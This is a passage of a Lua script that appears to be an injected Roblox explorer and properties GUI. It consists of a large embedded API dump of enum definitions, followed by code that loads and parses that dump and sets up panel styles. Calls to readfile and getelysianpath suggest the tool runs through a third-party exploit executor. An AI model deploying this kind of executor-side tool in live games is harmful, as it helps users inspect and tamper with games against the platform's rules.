],"Value":3,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level04","tags":[],"Value":4,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level05","tags":[],"Value":5,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level06","tags":[],"Value":6,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level07","tags":[],"Value":7,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level08","tags":[],"Value":8,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level09","tags":[],"Value":9,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level10","tags":[],"Value":10,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level11","tags":[],"Value":11,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level12","tags":[],"Value":12,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level13","tags":[],"Value":13,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level14","tags":[],"Value":14,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level15","tags":[],"Value":15,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level16","tags":[],"Value":16,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level17","tags":[],"Value":17,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level18","tags":[],"Value":18,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level19","tags":[],"Value":19,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level20","tags":[],"Value":20,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level21","tags":[],"Value":21,"Enum":"QualityLevel"},{"type":"Enum","Name":"RenderPriority","tags":[]},{"type":"EnumItem","Name":"First","tags":[],"Value":0,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Input","tags":[],"Value":100,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Camera","tags":[],"Value":200,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Character","tags":[],"Value":300,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Last","tags":[],"Value":2000,"Enum":"RenderPriority"},{"type":"Enum","Name":"Resolution","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"Resolution"},{"type":"EnumItem","Name":"720x526","tags":[],"Value":1,"Enum":"Resolution"},{"type":"EnumItem","Name":"800x600","tags":[],"Value":2,"Enum":"Resolution"},{"type":"EnumItem","Name":"1024x600","tags":[],"Value":3,"Enum":"Resolution"},{"type":"EnumItem","Name":"1024x768","tags":[],"Value":4,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x720","tags":[],"Value":5,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x768","tags":[],"Value":6,"Enum":"Resolution"},{"type":"EnumItem","Name":"1152x864","tags":[],"Value":7,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x800","tags":[],"Value":8,"Enum":"Resolution"},{"type":"EnumItem","Name":"1360x768","tags":[],"Value":9,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x960","tags":[],"Value":10,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x1024","tags":[],"Value":11,"Enum":"Resolution"},{"type":"EnumItem","Name":"1440x900","tags":[],"Value":12,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x900","tags":[],"Value":13,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x1024","tags":[],"Value":14,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x1200","tags":[],"Value":15,"Enum":"Resolution"},{"type":"EnumItem","Name":"1680x1050","tags":[],"Value":16,"Enum":"Resolution"},{"type":"EnumItem","Name":"1920x1080","tags":[],"Value":17,"Enum":"Resolution"},{"type":"EnumItem","Name":"1920x1200","tags":[],"Value":18,"Enum":"Resolution"},{"type":"Enum","Name":"ReverbType","tags":[]},{"type":"EnumItem","Name":"NoReverb","tags":[],"Value":0,"Enum":"ReverbType"},{"type":"EnumItem","Name":"GenericReverb","tags":[],"Value":1,"Enum":"ReverbType"},{"type":"EnumItem","Name":"PaddedCell","tags":[],"Value":2,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Room","tags":[],"Value":3,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Bathroom","tags":[],"Value":4,"Enum":"ReverbType"},{"type":"EnumItem","Name":"LivingRoom","tags":[],"Value":5,"Enum":"ReverbType"},{"type":"EnumItem","Name":"StoneRoom","tags":[],"Value":6,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Auditorium","tags":[],"Value":7,"Enum":"ReverbType"},{"type":"EnumItem","Name":"ConcertHall","tags":[],"Value":8,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Cave","tags":[],"Value":9,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Arena","tags":[],"Value":10,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Hangar","tags":[],"Value":11,"Enum":"ReverbType"},{"type":"EnumItem","Name":"CarpettedHallway","tags":[],"Value":12,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Hallway","tags":[],"Value":13,"Enum":"ReverbType"},{"type":"EnumItem","Name":"StoneCorridor","tags":[],"Value":14,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Alley","tags":[],"Value":15,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Forest","tags":[],"Value":16,"Enum":"ReverbType"},{"type":"EnumItem","Name":"City","tags":[],"Value":17,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Mountains","tags":[],"Value":18,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Quarry","tags":[],"Value":19,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Plain","tags":[],"Value":20,"Enum":"ReverbType"},{"type":"EnumItem","Name":"ParkingLot","tags":[],"Value":21,"Enum":"ReverbType"},{"type":"EnumItem","Name":"SewerPipe","tags":[],"Value":22,"Enum":"ReverbType"},{"type":"EnumItem","Name":"UnderWater","tags":[],"Value":23,"Enum":"ReverbType"},{"type":"Enum","Name":"RollOffMode","tags":[]},{"type":"EnumItem","Name":"Inverse","tags":[],"Value":0,"Enum":"RollOffMode"},{"type":"EnumItem","Name":"Linear","tags":[],"Value":1,"Enum":"RollOffMode"},{"type":"Enum","Name":"RotationType","tags":[]},{"type":"EnumItem","Name":"MovementRelative","tags":[],"Value":0,"Enum":"RotationType"},{"type":"EnumItem","Name":"CameraRelative","tags":[],"Value":1,"Enum":"RotationType"},{"type":"Enum","Name":"RuntimeUndoBehavior","tags":[]},{"type":"EnumItem","Name":"Aggregate","tags":[],"Value":0,"Enum":"RuntimeUndoBehavior"},{"type":"EnumItem","Name":"Snapshot","tags":[],"Value":1,"Enum":"RuntimeUndoBehavior"},{"type":"EnumItem","Name":"Hybrid","tags":[],"Value":2,"Enum":"RuntimeUndoBehavior"},{"type":"Enum","Name":"SaveFilter","tags":[]},{"type":"EnumItem","Name":"SaveAll","tags":[],"Value":2,"Enum":"SaveFilter"},{"type":"EnumItem","Name":"SaveWorld","tags":[],"Value":0,"Enum":"SaveFilter"},{"type":"EnumItem","Name":"SaveGame","tags":[],"Value":1,"Enum":"SaveFilter"},{"type":"Enum","Name":"SavedQualitySetting","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel1","tags":[],"Value":1,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel2","tags":[],"Value":2,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel3","tags":[],"Value":3,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel4","tags":[],"Value":4,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel5","tags":[],"Value":5,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel6","tags":[],"Value":6,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel7","tags":[],"Value":7,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel8","tags":[],"Value":8,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel9","tags":[],"Value":9,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel10","tags":[],"Value":10,"Enum":"SavedQualitySetting"},{"type":"Enum","Name":"ScaleType","tags":[]},{"type":"EnumItem","Name":"Stretch","tags":[],"Value":0,"Enum":"ScaleType"},{"type":"EnumItem","Name":"Slice","tags":[],"Value":1,"Enum":"ScaleType"},{"type":"Enum","Name":"SizeConstraint","tags":[]},{"type":"EnumItem","Name":"RelativeXY","tags":[],"Value":0,"Enum":"SizeConstraint"},{"type":"EnumItem","Name":"RelativeXX","tags":[],"Value":1,"Enum":"SizeConstraint"},{"type":"EnumItem","Name":"RelativeYY","tags":[],"Value":2,"Enum":"SizeConstraint"},{"type":"Enum","Name":"SleepAdjustMethod","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"SleepAdjustMethod"},{"type":"EnumItem","Name":"LastSample","tags":[],"Value":1,"Enum":"SleepAdjustMethod"},{"type":"EnumItem","Name":"AverageInterval","tags":[],"Value":2,"Enum":"SleepAdjustMethod"},{"type":"Enum","Name":"SoundType","tags":[]},{"type":"EnumItem","Name":"NoSound","tags":[],"Value":0,"Enum":"SoundType"},{"type":"EnumItem","Name":"Boing","tags":[],"Value":1,"Enum":"SoundType"},{"type":"EnumItem","Name":"Bomb","tags":[],"Value":2,"Enum":"SoundType"},{"type":"EnumItem","Name":"Break","tags":[],"Value":3,"Enum":"SoundType"},{"type":"EnumItem","Name":"Click","tags":[],"Value":4,"Enum":"SoundType"},{"type":"EnumItem","Name":"Clock","tags":[],"Value":5,"Enum":"SoundType"},{"type":"EnumItem","Name":"Slingshot","tags":[],"Value":6,"Enum":"SoundType"},{"type":"EnumItem","Name":"Page","tags":[],"Value":7,"Enum":"SoundType"},{"type":"EnumItem","Name":"Ping","tags":[],"Value":8,"Enum":"SoundType"},{"type":"EnumItem","Name":"Snap","tags":[],"Value":9,"Enum":"SoundType"},{"type":"EnumItem","Name":"Splat","tags":[],"Value":10,"Enum":"SoundType"},{"type":"EnumItem","Name":"Step","tags":[],"Value":11,"Enum":"SoundType"},{"type":"EnumItem","Name":"StepOn","tags":[],"Value":12,"Enum":"SoundType"},{"type":"EnumItem","Name":"Swoosh","tags":[],"Value":13,"Enum":"SoundType"},{"type":"EnumItem","Name":"Victory","tags":[],"Value":14,"Enum":"SoundType"},{"type":"Enum","Name":"SpecialKey","tags":[]},{"type":"EnumItem","Name":"Insert","tags":[],"Value":0,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"Home","tags":[],"Value":1,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"End","tags":[],"Value":2,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"PageUp","tags":[],"Value":3,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"PageDown","tags":[],"Value":4,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"ChatHotkey","tags":[],"Value":5,"Enum":"SpecialKey"},{"type":"Enum","Name":"Status","tags":[]},{"type":"EnumItem","Name":"Poison","tags":["deprecated"],"Value":0,"Enum":"Status"},{"type":"EnumItem","Name":"Confusion","tags":["deprecated"],"Value":1,"Enum":"Status"},{"type":"Enum","Name":"Stuff","tags":[]},{"type":"EnumItem","Name":"Heads","tags":[],"Value":0,"Enum":"Stuff"},{"type":"EnumItem","Name":"Faces","tags":[],"Value":1,"Enum":"Stuff"},{"type":"EnumItem","Name":"Hats","tags":[],"Value":2,"Enum":"Stuff"},{"type":"EnumItem","Name":"TShirts","tags":[],"Value":3,"Enum":"Stuff"},{"type":"EnumItem","Name":"Shirts","tags":[],"Value":4,"Enum":"Stuff"},{"type":"EnumItem","Name":"Pants","tags":[],"Value":5,"Enum":"Stuff"},{"type":"EnumItem","Name":"Gears","tags":[],"Value":6,"Enum":"Stuff"},{"type":"EnumItem","Name":"Torsos","tags":[],"Value":7,"Enum":"Stuff"},{"type":"EnumItem","Name":"LeftArms","tags":[],"Value":8,"Enum":"Stuff"},{"type":"EnumItem","Name":"RightArms","tags":[],"Value":9,"Enum":"Stuff"},{"type":"EnumItem","Name":"LeftLegs","tags":[],"Value":10,"Enum":"Stuff"},{"type":"EnumItem","Name":"RightLegs","tags":[],"Value":11,"Enum":"Stuff"},{"type":"EnumItem","Name":"Bodies","tags":[],"Value":12,"Enum":"Stuff"},{"type":"EnumItem","Name":"Costumes","tags":[],"Value":13,"Enum":"Stuff"},{"type":"Enum","Name":"Style","tags":[]},{"type":"EnumItem","Name":"AlternatingSupports","tags":[],"Value":0,"Enum":"Style"},{"type":"EnumItem","Name":"BridgeStyleSupports","tags":[],"Value":1,"Enum":"Style"},{"type":"EnumItem","Name":"NoSupports","tags":[],"Value":2,"Enum":"Style"},{"type":"Enum","Name":"SurfaceConstraint","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"Hinge","tags":[],"Value":1,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"SteppingMotor","tags":[],"Value":2,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":3,"Enum":"SurfaceConstraint"},{"type":"Enum","Name":"SurfaceType","tags":[]},{"type":"EnumItem","Name":"Smooth","tags":[],"Value":0,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Glue","tags":[],"Value":1,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Weld","tags":[],"Value":2,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Studs","tags":[],"Value":3,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Inlet","tags":[],"Value":4,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Universal","tags":[],"Value":5,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Hinge","tags":[],"Value":6,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":7,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"SteppingMotor","tags":[],"Value":8,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Unjoinable","tags":[],"Value":9,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"SmoothNoOutlines","tags":[],"Value":10,"Enum":"SurfaceType"},{"type":"Enum","Name":"SwipeDirection","tags":[]},{"type":"EnumItem","Name":"Right","tags":[],"Value":0,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Left","tags":[],"Value":1,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Up","tags":[],"Value":2,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Down","tags":[],"Value":3,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"None","tags":[],"Value":4,"Enum":"SwipeDirection"},{"type":"Enum","Name":"TeleportState","tags":[]},{"type":"EnumItem","Name":"RequestedFromServer","tags":[],"Value":0,"Enum":"TeleportState"},{"type":"EnumItem","Name":"Started","tags":[],"Value":1,"Enum":"TeleportState"},{"type":"EnumItem","Name":"WaitingForServer","tags":[],"Value":2,"Enum":"TeleportState"},{"type":"EnumItem","Name":"Failed","tags":[],"Value":3,"Enum":"TeleportState"},{"type":"EnumItem","Name":"InProgress","tags":[],"Value":4,"Enum":"TeleportState"},{"type":"Enum","Name":"TeleportType","tags":[]},{"type":"EnumItem","Name":"ToPlace","tags":[],"Value":0,"Enum":"TeleportType"},{"type":"EnumItem","Name":"ToInstance","tags":[],"Value":1,"Enum":"TeleportType"},{"type":"EnumItem","Name":"ToReservedServer","tags":[],"Value":2,"Enum":"TeleportType"},{"type":"Enum","Name":"TextXAlignment","tags":[]},{"type":"EnumItem","Name":"Left","tags":[],"Value":0,"Enum":"TextXAlignment"},{"type":"EnumItem","Name":"Center","tags":[],"Value":2,"Enum":"TextXAlignment"},{"type":"EnumItem","Name":"Right","tags":[],"Value":1,"Enum":"TextXAlignment"},{"type":"Enum","Name":"TextYAlignment","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":0,"Enum":"TextYAlignment"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"TextYAlignment"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":2,"Enum":"TextYAlignment"},{"type":"Enum","Name":"ThreadPoolConfig","tags":[]},{"type":"EnumItem","Name":"Auto","tags":[],"Value":0,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore1","tags":[],"Value":101,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore2","tags":[],"Value":102,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore3","tags":[],"Value":103,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore4","tags":[],"Value":104,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads1","tags":[],"Value":1,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads2","tags":[],"Value":2,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads3","tags":[],"Value":3,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads4","tags":[],"Value":4,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads8","tags":[],"Value":8,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads16","tags":[],"Value":16,"Enum":"ThreadPoolConfig"},{"type":"Enum","Name":"ThrottlingPriority","tags":[]},{"type":"EnumItem","Name":"Extreme","tags":[],"Value":2,"Enum":"ThrottlingPriority"},{"type":"EnumItem","Name":"ElevatedOnServer","tags":[],"Value":1,"Enum":"ThrottlingPriority"},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ThrottlingPriority"},{"type":"Enum","Name":"TickCountSampleMethod","tags":[]},{"type":"EnumItem","Name":"Fast","tags":[],"Value":0,"Enum":"TickCountSampleMethod"},{"type":"EnumItem","Name":"Benchmark","tags":[],"Value":1,"Enum":"TickCountSampleMethod"},{"type":"EnumItem","Name":"Precise","tags":[],"Value":2,"Enum":"TickCountSampleMethod"},{"type":"Enum","Name":"TopBottom","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":0,"Enum":"TopBottom"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"TopBottom"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":2,"Enum":"TopBottom"},{"type":"Enum","Name":"TouchCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"TouchCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"TouchCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"TouchCameraMovementMode"},{"type":"Enum","Name":"TouchMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"Thumbstick","tags":[],"Value":1,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"DPad","tags":[],"Value":2,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"Thumbpad","tags":[],"Value":3,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":4,"Enum":"TouchMovementMode"},{"type":"Enum","Name":"TweenStatus","tags":[]},{"type":"EnumItem","Name":"Canceled","tags":[],"Value":0,"Enum":"TweenStatus"},{"type":"EnumItem","Name":"Completed","tags":[],"Value":1,"Enum":"TweenStatus"},{"type":"Enum","Name":"UiMessageType","tags":[]},{"type":"EnumItem","Name":"UiMessageError","tags":[],"Value":0,"Enum":"UiMessageType"},{"type":"EnumItem","Name":"UiMessageInfo","tags":[],"Value":1,"Enum":"UiMessageType"},{"type":"Enum","Name":"UploadSetting","tags":[]},{"type":"EnumItem","Name":"Never","tags":[],"Value":0,"Enum":"UploadSetting"},{"type":"EnumItem","Name":"Ask","tags":[],"Value":1,"Enum":"UploadSetting"},{"type":"EnumItem","Name":"Always","tags":[],"Value":2,"Enum":"UploadSetting"},{"type":"Enum","Name":"UserCFrame","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"UserCFrame"},{"type":"EnumItem","Name":"LeftHand","tags":[],"Value":1,"Enum":"UserCFrame"},{"type":"EnumItem","Name":"RightHand","tags":[],"Value":2,"Enum":"UserCFrame"},{"type":"Enum","Name":"UserInputState","tags":[]},{"type":"EnumItem","Name":"Begin","tags":[],"Value":0,"Enum":"UserInputState"},{"type":"EnumItem","Name":"Change","tags":[],"Value":1,"Enum":"UserInputState"},{"type":"EnumItem","Name":"End","tags":[],"Value":2,"Enum":"UserInputState"},{"type":"EnumItem","Name":"Cancel","tags":[],"Value":3,"Enum":"UserInputState"},{"type":"EnumItem","Name":"None","tags":[],"Value":4,"Enum":"UserInputState"},{"type":"Enum","Name":"UserInputType","tags":[]},{"type":"EnumItem","Name":"MouseButton1","tags":[],"Value":0,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseButton2","tags":[],"Value":1,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseButton3","tags":[],"Value":2,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseWheel","tags":[],"Value":3,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseMovement","tags":[],"Value":4,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Touch","tags":[],"Value":7,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Keyboard","tags":[],"Value":8,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Focus","tags":[],"Value":9,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Accelerometer","tags":[],"Value":10,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gyro","tags":[],"Value":11,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad1","tags":[],"Value":12,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad2","tags":[],"Value":13,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad3","tags":[],"Value":14,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad4","tags":[],"Value":15,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad5","tags":[],"Value":16,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad6","tags":[],"Value":17,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad7","tags":[],"Value":18,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad8","tags":[],"Value":19,"Enum":"UserInputType"},{"type":"EnumItem","Name":"TextInput","tags":[],"Value":20,"Enum":"UserInputType"},{"type":"EnumItem","Name":"None","tags":[],"Value":21,"Enum":"UserInputType"},{"type":"Enum","Name":"VibrationMotor","tags":[]},{"type":"EnumItem","Name":"Large","tags":[],"Value":0,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"Small","tags":[],"Value":1,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"LeftTrigger","tags":[],"Value":2,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"RightTrigger","tags":[],"Value":3,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"LeftHand","tags":[],"Value":4,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"RightHand","tags":[],"Value":5,"Enum":"VibrationMotor"},{"type":"Enum","Name":"VideoQualitySettings","tags":[]},{"type":"EnumItem","Name":"LowResolution","tags":[],"Value":0,"Enum":"VideoQualitySettings"},{"type":"EnumItem","Name":"MediumResolution","tags":[],"Value":1,"Enum":"VideoQualitySettings"},{"type":"EnumItem","Name":"HighResolution","tags":[],"Value":2,"Enum":"VideoQualitySettings"},{"type":"Enum","Name":"WaterDirection","tags":[]},{"type":"EnumItem","Name":"NegX","tags":[],"Value":0,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"X","tags":[],"Value":1,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"NegY","tags":[],"Value":2,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"Y","tags":[],"Value":3,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"NegZ","tags":[],"Value":4,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"Z","tags":[],"Value":5,"Enum":"WaterDirection"},{"type":"Enum","Name":"WaterForce","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Small","tags":[],"Value":1,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Medium","tags":[],"Value":2,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Strong","tags":[],"Value":3,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Max","tags":[],"Value":4,"Enum":"WaterForce"}]
]===]
	return rawApiJson
end

function getCurrentApiJson()
	local jsonStr = nil
	if readfile and getelysianpath then
		if readfile(getelysianpath().."Xpl0rerApi.txt") then
			print("Api found in folder!")
			jsonStr = readfile(getelysianpath().."Xpl0rerApi.txt")
			return jsonStr
		end
	end
	local success, err = pcall(function()
		jsonStr = httpGet(apiUrl)
		print("Fetched json successfully")
	end)
	if success then
		print("Returning json")
		--print(jsonStr:sub(1,500))
		return jsonStr
	else
		print("Error fetching json: " .. tostring(err))
		print("Falling back to local copy")
		return getLocalApiJson()
	end
end

function splitStringIntoChunks(jsonStr)
	-- Splits up a string into a table with a given size
	local t = {}
	for i = 1, math.ceil(string.len(jsonStr)/maxChunkSize) do
		local str = jsonStr:sub((i-1)*maxChunkSize+1, i*maxChunkSize)
		table.insert(t, str)
	end
	return t
end

local jsonToParse = getCurrentApiJson()
local apiChunks = splitStringIntoChunks(jsonToParse)

function getRbxApi()
--[[
	Api.Classes
	Api.Enums
	Api.GetProperties(className)
	Api.IsEnum(valueType)
--]]

-- Services
local HttpService = game:GetService("HttpService")
local ServerStorage = game:GetService("ServerStorage")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Remotes
--local Remotes = ReplicatedStorage:WaitForChild("OnlineStudio"):WaitForChild("Remotes")
--local GetApiJsonFunction = Remotes:WaitForChild("GetApiJson")

-- Functions
local JsonDecode = function(s) return HttpService:JSONDecode(s) end

local function GetApiRemoteFunction(index)
	if (apiChunks[index]) then 
		return apiChunks[index], #apiChunks
	else
		print("Bad index for GetApiJson")
		return nil
	end
end

local function getApiJson()
	local apiTable = {}
	local firstPage, pageCount = GetApiRemoteFunction(1)
	table.insert(apiTable, firstPage)
	for i = 2, pageCount do
		--print("Fetching API page # " .. tostring(i))
		local result = GetApiRemoteFunction(i)
		table.insert(apiTable, result)
	end
	return table.concat(apiTable)
end

local json = getApiJson()
local apiDump =  JsonDecode(json)

local Classes = {}
local Enums = {}

local function sortAlphabetic(t, property)
	table.sort(t, 
		function(x,y) return x[property] < y[property]
	end)
end

local function isEnum(name)
	return Enums[name] ~= nil
end

local function getProperties(className)
	local class = Classes[className]
	local properties = {}
	
	if not class then return properties end
	
	while class do
		for _,property in pairs(class.Properties) do
			table.insert(properties, property)
		end
		class = Classes[class.Superclass]
	end
	
	sortAlphabetic(properties, "Name")

	return properties
end

for _,item in pairs(apiDump) do
	local itemType = item.type
-- Classes --
	if (itemType == 'Class') then
		Classes[item.Name] = item
		item.Properties = {}
		item.Functions = {}
		item.YieldFunctions = {}
		item.Events = {}
		item.Callbacks = {}
-- Members --
	elseif (itemType == 'Property') then
		table.insert(Classes[item.Class].Properties, item)
	elseif (itemType == 'Function') then
		table.insert(Classes[item.Class].Functions, item)
	elseif (itemType == 'YieldFunction') then
		table.insert(Classes[item.Class].YieldFunctions, item)
	elseif (itemType == 'Event') then
		table.insert(Classes[item.Class].Events, item)
	elseif (itemType == 'Callback') then
		table.insert(Classes[item.Class].Callbacks, item)
-- Enums --
	elseif (itemType == 'Enum') then
		Enums[item.Name] = item
		item.EnumItems = {}
	elseif (itemType == 'EnumItem') then
		Enums[item.Enum].EnumItems[item.Name] = item
	end
end

return {
	Classes = Classes;
	Enums = Enums;
	GetProperties = getProperties;
	IsEnum = isEnum;
}
end

-- Modules
local Permissions = {CanEdit = true}
local RbxApi = getRbxApi()

--[[
	RbxApi.Classes
	RbxApi.Enums
	RbxApi.GetProperties(className)
	RbxApi.IsEnum(valueType)
--]]

-- Styles

local function CreateColor3(r, g, b) return Color3.new(r/255,g/255,b/255) end

local Styles = {
	Font = Enum.Font.Arial;
	Margin = 5;
	Black = CreateColor3(0,0,0);
	White = CreateColor3(255,255,255);
}

local Row = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextXAlignment = Enum.TextXAlignment.Left;
	TextColor = Styles.Black;
	TextColorOver = Styles.White;
	TextLockedColor = CreateColor3(120,120,120);
	Height = 24;
	BorderColor = CreateColor3(216,216,216);
	BackgroundColor = Styles.White;
	BackgroundColorAlternate = CreateColor3(246,246,246);
	BackgroundColorMouseover = CreateColor3(211,224,244);
	TitleMarginLeft = 15;
}

local DropDown = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextColor = CreateColor3(0,0,0);
	TextColorOver = Styles.White;
	TextXAlignment = Enum.TextXAlignment.Left;
	Height = 16;
	BackColor = Styles.White;
	BackColorOver = CreateColor3(86,125,188);
	BorderColor = CreateColor3(216,216,216);
	BorderSizePixel = 2;
	ArrowColor = CreateColor3(160,160,160);
	ArrowColorOver = Styles.Black;
}

local BrickColors = {
	BoxSize = 13;
	BorderSizePixel = 1;
	BorderColor = CreateColor3(160,160,160);
	FrameColor = CreateColor3(160,160,160);
	Size = 20;
	Padding = 4;
	ColorsPerRow = 8;
	OuterBorder = 1;
	OuterBorderColor = Styles.Black;
}

wait(1)

local Gui = D_E_X
local PropertiesFrame = Gui:WaitForChild("PropertiesFrame")
local ExplorerFrame = Gui:WaitForChild("ExplorerPanel")

